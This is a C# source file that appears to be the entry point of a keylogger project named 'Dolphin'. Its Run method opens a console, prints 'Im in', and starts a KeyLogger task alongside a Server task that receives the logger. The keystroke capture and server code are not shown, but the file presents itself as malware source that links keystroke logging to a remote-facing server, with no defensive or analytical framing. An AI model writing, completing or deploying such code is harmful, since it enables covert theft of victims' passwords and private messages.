using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dolphin
{
    static class Entry
    {
        #region Console

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AttachConsole(int dwProcessId);

        static StreamWriter _stdOutWriter;

        #endregion

        public static  void Run()
        {
            var stdout = Console.OpenStandardOutput();
            _stdOutWriter = new StreamWriter(stdout) {AutoFlush = true};

            if (!AttachConsole(-1))
                AllocConsole();
            Console.WriteLine("Im in");
            var logger = new KeyLogger();
            Task logging = Task.Run(() => logger.Run());
            Task server = Task.Run(() => Server.Run(logger));
            server.Wait();
            Console.ReadKey();
        }
    }
}
